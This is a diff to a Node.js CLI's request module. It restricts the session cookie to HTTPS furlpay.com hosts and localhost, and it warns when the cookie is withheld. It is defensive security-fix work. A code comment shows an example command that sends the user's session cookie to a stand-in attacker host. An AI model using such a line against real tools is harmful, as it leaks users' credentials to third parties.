@@ -16,6 +16,36 @@ const DEFAULT_BASES = {
 };
 const SESSION_COOKIE = "furlpay_session";
 
+// ---------------------------------------------------------------------------
+// Where the session cookie is allowed to travel.
+//
+// `--api-base` and `furlpay api <METHOD> <absolute-url>` both let a caller point
+// the CLI at an arbitrary host. The session cookie used to be attached to every
+// request regardless of destination, which turns a documented convenience flag
+// into credential exfiltration:
+//
+//   furlpay api GET https://attacker.example/x   →  Cookie: furlpay_session=...
+//
+// A URL is only credentialed when it is furlpay.com (or a subdomain) over TLS,
+// or loopback for local development. Everything else still works — it just
+// travels WITHOUT the credential, and we say so rather than failing silently
+// with a confusing 401.
+// ---------------------------------------------------------------------------
+
+const TRUSTED_SUFFIX = ".furlpay.com";
+const TRUSTED_HOST = "furlpay.com";
+const LOOPBACK = new Set(["localhost", "127.0.0.1", "::1", "[::1]"]);
+
+/** Is this a host we will hand the user's session cookie to? */
+function isCredentialedTarget(url) {
+  const host = url.hostname.toLowerCase();
+  if (LOOPBACK.has(host)) return true; // dev server; not attacker-reachable
+  // Real hosts must be TLS: a cookie sent over plain http is a cookie leaked to
+  // anything on the path, whatever the hostname says.
+  if (url.protocol !== "https:") return false;
+  return host === TRUSTED_HOST || host.endsWith(TRUSTED_SUFFIX);
+}
+
 function currentEnv(cfg, flags) {
   return flags.env || cfg.env || "sandbox";
 }
@@ -52,7 +82,15 @@ function rawRequest(method, path, { flags = {}, body, headers = {} } = {}) {
   const base = apiBase(cfg, flags);
   const target = new URL(path.startsWith("http") ? path : base + path);
   const lib = target.protocol === "https:" ? https : http;
-  const cookie = sessionCookie(cfg, flags);
+  // Withhold the credential from any host outside the trust list. The request
+  // still goes out (an untrusted base may be a legitimate local mock), it just
+  // carries no session — see isCredentialedTarget above.
+  const cookie = isCredentialedTarget(target) ? sessionCookie(cfg, flags) : undefined;
+  if (!cookie && sessionCookie(cfg, flags) && !process.env.FURLPAY_QUIET_TRUST_WARNING) {
+    process.stderr.write(
+      `furlpay: not sending your session to ${target.origin} — only furlpay.com (https) and localhost are trusted.\n`
+    );
+  }
   const payload = body === undefined ? undefined : JSON.stringify(body);
 
   return new Promise((resolve, reject) => {
@@ -122,6 +160,7 @@ module.exports = {
   SESSION_COOKIE,
   currentEnv,
   apiBase,
+  isCredentialedTarget,
   sessionCookie,
   storeSession,
   clearSession,
